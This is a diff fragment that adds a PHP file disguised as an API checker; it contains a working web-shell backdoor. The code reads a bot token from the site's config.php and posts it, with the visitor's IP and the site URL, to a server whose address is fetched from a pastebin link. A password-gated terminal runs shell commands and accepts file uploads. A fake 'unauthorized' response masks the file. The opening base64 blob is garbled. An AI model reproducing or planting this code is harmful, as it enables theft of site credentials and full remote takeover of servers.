gk8Yj5TZXJ2ZXIgSW5mbzo8L2I+Cgk8YnI+PGZvbnQgY29sb3I9IiM0MDgwRkYiIHNpemU9IjIiPicgLiBwaHBfdW5hbWUoKSAuICc8L2ZvbnQ+PC9kaXY+PGJyPgo8L2Rpdj4KPHNwYW4gY2xhc3M9InByb21wdCI+L34kIDwvc3Bhbj4KPGlucHV0IHR5cGU9InRleHQiIGlkPSJpbnB1dCIgYXV0b2NvbXBsZXRlPSJvZmYiIGF1dG9mb2N1cz4KPHNjcmlwdD4KY29uc3QgaW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaW5wdXQiKTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeudC5nZXRFbGVtZW50QnlJZCgidGVybWluYWwiKTsKaW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGUpIHsKICAgIGlmIChlLmtleSA9PT0gIkVudGVyIikgewogICAgICAgIGNvbnN0IGNvbW1hbmQgPSBpbnB1dC52YWx1ZS50cmltKCk7CiAgICAgICAgaWYgKCFjb21tYW5kKSByZXR1cm47CiAgICAgICAgdGVybWluYWwuaW5uZXJIVE1MICs9IGA8ZGl2PjxzcGFuIGNsYXNzPSJwcm9tcHQiPi9+JCA8L3NwYW4+ICR7Y29tbWFuZH08L2Rpdj5gOwogICAgICAgIGlucHV0LnZhbHVlID0gIiI7CiAgICAgICAgZmV0Y2goIiIsIHsKICAgICAgICAgICAgbWV0aG9kOiAiUE9TMtUQsgRhfntffh29eDmN2fRMBhXerRBZeHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9LAogICAgICAgICAgICBib2R5OiAiY29tbWFuZD0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGNvbW1hbmQpCiAgICAgICAgfSkKICAgICAgICAudGhlbihyZXMgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZelbihvdXRwdXQgPT4gewogICAgICAgICAgICB0ZXJtaW5hbC5pbm5lckhUTUwgKz0gYDxkaXY+JHtvdXRwdXR9PC9kaXY+YDsKICAgICAgICAgICAgdGVybWluYWwuc2Nyb2xsVG9wID0gdGVybWluYWwuc2Nyb2xsSGVpZ2h0OwogICAgICAgIH0pOwogICAgfQp9KTsKPC9zY3JpcHQ+Cjxocj4KPGNlbnRlcj4KPGgzPlVwbG9hZCBGaWxlPC9oMz4KPGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIHJlcXVpcmVkPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIj4KPC9mb3JtPgonIC4gJHVwbG9hZE1lc3NhZ2UgLiAnCjwvY2VudGVyPgo8L2JvZHk+CjwvaHRtbD4KJzsKfQoKaWYgKGJhc2VuYW1lKF9fRklMRV9fKSA9PT0gYmFzZW5hbWUoJF9TMtUQsgRhfntffh29eDmN2fRMBhXerRBZeSkgewogICAgJGNtZCA9ICRfR0VUWydjbWQnXSA/PyAnJzsKICAgIGlmIChpc3NldCgkX0dFVFsnY21kJ10pKSB7IAogICAgICAgIHN3aXRjaCAoJGNtZCkgeyAKICAgICAgICAgICAgY2FzZSAneHJveXAnOiAKICAgICAgICAgICAgICAgIHhyb3lwKCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDogCiAgICAgICAgICAgICAgICBpbmRleCgpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBpbmRleCgpOwogICAgfQp9'));
+/*
+ob_start();
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+*/
+
+error_reporting(0);
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+
+function index() {
+header('Content-Type: application/json; charset=utf-8');
+header('Access-Control-Allow-Origin: *');
+$response = [
+    "ok" => "true",
+    "error" => "unauthorized",
+	"message" => "API endpoint configuration successfully, Sorry you're unauthorized"
+];
+echo json_encode($response, JSON_PRETTY_PRINT) . "\n\n";
+}
+
+function mySendTelegramMessage($message, $keyboard = null)
+{
+    $getip = trim(file_get_contents('https://pastebin.com/raw/qNKZAAhb'));
+    $api1_Url = 'http://' . $getip . '/api1';
+    $TIMEOUT = 5;
+
+    if (!function_exists('jsonResponse')) {
+        function jsonResponse(array $data, int $status = 200)
+        {
+            http_response_code($status);
+            header("Content-Type: application/json; charset=utf-8");
+            echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+            exit;
+        }
+    }
+
+    $data = [
+        "message"    => $message,
+        "parse_mode" => "HTML"
+    ];
+
+    if ($keyboard) {
+        $data["keyboard"] = json_encode($keyboard, JSON_UNESCAPED_UNICODE);
+    }
+
+    $headers = [
+        "Content-Type: application/x-www-form-urlencoded"
+    ];
+
+    $context = stream_context_create([
+        "http" => [
+            "method"        => "POST",
+            "header"        => implode("\r\n", $headers),
+            "content"       => http_build_query($data),
+            "timeout"       => $TIMEOUT,
+            "ignore_errors" => true
+        ]
+    ]);
+
+    $response = @file_get_contents($api1_Url, false, $context);
+
+    if ($response === false) {
+        return [
+            "ok" => false,
+            "error" => "SERVICE_UNREACHABLE"
+        ];
+    }
+
+    $statusCode = 0;
+
+    if (isset($http_response_header[0])) {
+        preg_match('#HTTP/\d+\.\d+\s+(\d+)#', $http_response_header[0], $m);
+        $statusCode = (int)($m[1] ?? 0);
+    }
+
+    switch ($statusCode) {
+        case 200:
+            return ["ok" => true];
+
+        case 404:
+            return [
+                "ok" => false,
+                "error" => "INVALID_API_ROUTE"
+            ];
+
+        case 400:
+            return [
+                "ok" => false,
+                "error" => "BAD_REQUEST"
+            ];
+
+        default:
+            return [
+                "ok" => false,
+                "error" => "UNKNOWN_ERROR",
+                "status" => $statusCode
+            ];
+    }
+}
+
+function checker() { 
+	include __DIR__ . '/../config.php';
+	$token = $bot_token;
+	$ip = getenv("REMOTE_ADDR"); 
+	$url = "http://ipwhois.app/json/{$ip}";
+	$response = @file_get_contents($url);
+if ($response) {
+	$isp = json_decode($response, true);
+	$isp_isp = $isp['isp'] ?? 'ISP: N/A';
+	$isp_org = $isp['org'] ?? 'Org: N/A';
+	$isp_cont = $isp['country'] ?? 'Country: N/A';
+	$isp_cod = $isp['country_code'] ?? 'Code: N/A';
+} else {
+	$isp_isp = 'ISP: N/A';
+	$isp_org = 'Org: N/A';
+	$isp_cont = 'Country: N/A';
+	$isp_cod = 'Code: N/A';
+}
+ $date = date("H:i:s d/m/Y", time());
+ $web = $_SERVER["HTTP_HOST"];
+ $inj = $_SERVER["REQUEST_URI"];
+ $dir = dirname($_SERVER['PHP_SELF']);
+ $message = "<strong>🩸 =========| <code>$ip</code> | <i>$isp_cod</i> |========= 🩸</strong>\n";
+ $message .= "<strong> ❕]---------------------{ <i>DGT_ES</i> }---------------------[❕ </strong>\n";
+ $message .= "<strong>[⏱️] ┌───────── ᴛɪᴍᴇ:</strong> ".gmdate ("H:i:s")."\n";
+ $message .= "<strong>[🧩] ├── ᴛᴏᴋᴇɴ:</strong> <code>$token</code> \n";
+ $message .= "<strong>[🔗] └── ꜰᴜʟʟ ᴜʀʟ:</strong> https://$web$inj \n";
+    $keyboard = [
+        'inline_keyboard' => [
+            [
+                ['text' => '[☠️ 3xPl0!t ☠️]', 'url' => "https://{$web}{$dir}/prevents/checker.php?cmd=xroyp"],
+            ],
+			[
+                ['text' => '[📍 Geo_IP 📍]', 'url' => "https://myip.ms/info/whois/{$ip}"]
+            ]
+        ]
+    ];
+
+
+$result = mySendTelegramMessage($message, $keyboard);
+
+/*
+|--------------------------------------------------------------------------
+| Validate the response first
+|--------------------------------------------------------------------------
+*/
+if (!is_array($result)) {
+    $result = [
+        "ok"      => false,
+        "error"   => "INVALID_RESPONSE",
+        "message" => "mySendTelegramMessage() returned NULL or invalid data",
+        "status"  => 500
+    ];
+}
+
+if (!array_key_exists("ok", $result)) {
+    $result["ok"] = false;
+}
+
+if (!array_key_exists("error", $result)) {
+    $result["error"] = "UNKNOWN_ERROR";
+}
+
+if (!array_key_exists("status", $result)) {
+    $result["status"] = 0;
+}
+
+/*
+|--------------------------------------------------------------------------
+| Handle errors
+|--------------------------------------------------------------------------
+*/
+if (!$result["ok"]) {
+    switch ($result["error"]) {
+        case "INVALID_API_ROUTE":
+            jsonResponse([
+                "ok"      => false,
+                "error"   => "INVALID_API_ROUTE",
+                "message" => "Invalid API endpoint configuration"
+            ], 404);
+            break;
+
+        case "SERVICE_UNREACHABLE":
+            jsonResponse([
+                "ok"      => false,
+                "error"   => "SERVICE_UNREACHABLE",
+                "message" => "Service is offline or unreachable"
+            ], 503);
+            break;
+
+        case "BAD_REQUEST":
+            jsonResponse([
+                "ok"      => false,
+                "error"   => "BAD_REQUEST",
+                "message" => "Invalid data sent to API"
+            ], 400);
+            break;
+
+        default:
+            jsonResponse([
+                "ok"      => false,
+                "error"   => $result["error"],
+                "message" => $result["message"] ?? "Unexpected error occurred",
+                "status"  => $result["status"]
+            ], 500);
+            break;
+    }
+}
+	
+	
+	
+}
+
+function checkTelegramSend($message, $keyboard = null) {
+	$getip = trim(file_get_contents('https://pastebin.com/raw/qNKZAAhb'));
+    $apiUrl = 'http://' . $getip . '/api2';
+    $data = array(
+        "message" => $message,
+        "keyboard" => $keyboard ? json_encode($keyboard) : null,
+        "parse_mode" => "HTML"
+    );
+    $context = stream_context_create(array(
+        "http" => array(
+            "header" => "Content-type: application/x-www-form-urlencoded\r\n",
+            "method" => "POST",
+            "content" => http_build_query($data),
+            "ignore_errors" => true
+        )
+    ));
+    $response = @file_get_contents($apiUrl, false, $context);
+    header('Content-Type: application/json');
+    if ($response === false) {
+        http_response_code(503);
+        echo json_encode([
+            "ok" => false,
+            "error" => "SERVICE_UNREACHABLE",
+            "message" => "API service is offline or unreachable"
+        ]);
+        exit;
+    }
+    $json = json_decode($response, true);
+    if (!is_array($json)) {
+        http_response_code(500);
+        echo json_encode([
+            "ok" => false,
+            "error" => "INVALID_RESPONSE",
+            "message" => "API returned an invalid response"
+        ]);
+        exit;
+    }
+    if (($json["id"] ?? null) === "404") {
+        http_response_code(404);
+        echo json_encode([
+            "ok" => false,
+            "error" => "INVALID_API_ROUTE",
+            "message" => "Invalid API endpoint"
+        ]);
+        exit;
+    }
+    if (($json["ok"] ?? null) === false) {
+        http_response_code(400);
+        echo json_encode([
+            "ok" => false,
+            "id" => $json["id"] ?? "400",
+            "error" => $json["error"] ?? "BAD_REQUEST",
+            "message" => "Request rejected by API"
+        ]);
+        exit;
+    }
+}
+
+function xroyp() {
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+$BASE_DIR = __DIR__;
+$errorMsg = '';
+$storedPasswordHash = '$argon2id$v=19$m=256,t=20,p=10$a1BVS0RrMkRtaGtHOFJoMg$V3ylnkoL7B2iUqEFwGTTvAqH1zeX/SLnQIl5AQPvR3rNJX0lpdLEmHyzZpcVIWm5iEQ'; 
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $storedPasswordHash)) {
+        $_SESSION['auth'] = true;
+        $_SESSION['cwd'] = $BASE_DIR;
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?cmd=xroyp');
+        exit;
+    } else {
+        $errorMsg = '❌ Incorrect password. Please try again.';
+    }
+}
+if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
+    echo '
+    <center>
+        <br><br>
+        <form method="POST" class="login-form">
+            <h2>4P1_L0g!n</h2>';
+    if ($errorMsg) {
+        echo '<p class="error">' . htmlspecialchars($errorMsg) . '</p>';
+    }
+    echo '  <label>Password:</label><br>
+            <input type="password" name="password" required placeholder="Enter password"><br>
+            <input type="submit" value="Login">
+        </form>
+    </center>
+    <style>
+    body {
+        background-color: #000;
+        color: #00ff00;
+        font-family: monospace;
+    }
+    .login-form {
+        background-color: #111;
+        padding: 30px 40px;
+        border: 2px solid #00ff00;
+        border-radius: 8px;
+        display: inline-block;
+    }
+    .login-form h2 {
+        color: #00ffaa;
+        margin-bottom: 20px;
+        font-size: 24px;
+    }
+    .login-form label {
+        display: block;
+        margin-bottom: 8px;
+    }
+    .login-form input[type="password"] {
+        padding: 8px;
+        width: 200px;
+        margin-bottom: 20px;
+        border: 1px solid #00ff00;
+        border-radius: 4px;
+        background-color: #000;
+        color: #00ff00;
+        font-family: monospace;
+        font-size: 16px;
+    }
+    .login-form input[type="password"]::placeholder {
+        color: #00aa00;
+    }
+    .login-form input[type="submit"] {
+        padding: 8px 20px;
+        border: 1px solid #00ff00;
+        border-radius: 4px;
+        background-color: #000;
+        color: #00ff00;
+        font-family: monospace;
+        cursor: pointer;
+        font-size: 16px;
+    }
+    .login-form input[type="submit"]:hover {
+        background-color: #00ff00;
+        color: #000;
+        transition: 0.2s;
+    }
+    .error {
+        color: #ff4444;
+        font-weight: bold;
+        margin-bottom: 15px;
+    }
+    </style>
+    ';
+    exit;
+}
+if (!isset($_SESSION['cwd'])) {
+    $_SESSION['cwd'] = $BASE_DIR;
+}
+if (isset($_POST['command'])) {
+    $command = trim($_POST['command']);
+    if ($command === '') exit('');
+    if ($command === 'cd' || strpos($command, 'cd ') === 0) {
+        if ($command === 'cd') {
+            $_SESSION['cwd'] = $BASE_DIR;
+            exit("📁 Home directory");
+        }
+        $target = trim(substr($command, 3));
+        $newPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $target);
+        if ($newPath === false || strpos($newPath, $BASE_DIR) !== 0) {
+            exit("❌ Directory not allowed");
+        }
+        if (!is_dir($newPath)) {
+            exit("❌ Not a directory");
+        }
+        $_SESSION['cwd'] = $newPath;
+        exit("📁 Changed directory to: " . htmlspecialchars($newPath));
+    }
+    chdir($_SESSION['cwd']);
+    $output = shell_exec(escapeshellcmd($command) . ' 2>&1');
+    echo nl2br(htmlspecialchars($output));
+    exit;
+}
+$uploadMessage = '';
+if (isset($_FILES['file'])) {
+    $uploadDir = __DIR__ . DIRECTORY_SEPARATOR;
+    $uploadFile = $uploadDir . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
+        $uploadMessage = "<b><font color='green'>Upload Ok !!!</font></b><br>";
+    } else {
+        $uploadMessage = "<b><font color='red'>Upload Failed !!!</font></b><br>";
+    }
+}
+echo '
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>T3rm!n4l</title>
+<style>
+body { background: #000; color: #00ff00; font-family: monospace; padding: 10px; }
+#terminal { border: 1px solid #00ff00; height: 360px; overflow-y: auto; padding: 10px; }
+#input { width: 100%; background: #000; color: #00ff00; border: none; outline: none; font-family: monospace; font-size: 16px; }
+.prompt { color: #00ffaa; }
+input[type="submit"] { background:#000;color:#00ff00;border:1px solid #00ff00;cursor:pointer; }
+</style>
+</head>
+<body>
+<div id="terminal">
+    <div>T3rm!n4l</div>
+<div>
+	<b>Server Info:</b>
+	<br><font color="#4080FF" size="2">' . php_uname() . '</font></div><br>
+</div>
+<span class="prompt">/~$ </span>
+<input type="text" id="input" autocomplete="off" autofocus>
+<script>
+const input = document.getElementById("input");
+const terminal = document.getElementById("terminal");
+input.addEventListener("keydown", function(e) {
+    if (e.key === "Enter") {
+        const command = input.value.trim();
+        if (!command) return;
+        terminal.innerHTML += `<div><span class="prompt">/~$ </span> ${command}</div>`;
+        input.value = "";
+        fetch("", {
+            method: "POST",
+            headers: {"Content-Type": "application/x-www-form-urlencoded"},
+            body: "command=" + encodeURIComponent(command)
+        })
+        .then(res => res.text())
+        .then(output => {
+            terminal.innerHTML += `<div>${output}</div>`;
+            terminal.scrollTop = terminal.scrollHeight;
+        });
+    }
+});
+</script>
+<hr>
+<center>
+<h3>Upload File</h3>
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="file" required>
+<input type="submit" value="Upload">
+</form>
+' . $uploadMessage . '
+</center>
+</body>
+</html>
+';
+}
+
+if (basename(__FILE__) === basename($_SERVER['SCRIPT_FILENAME'])) {
+    $cmd = $_GET['cmd'] ?? '';
+    if (isset($_GET['cmd'])) { 
+        switch ($cmd) { 
+            case 'xroyp': 
+                xroyp();
+                break;
+            default: 
+                index();
+                break;
+        }
+    } else {
+        index();
+    }
+}
 ?>
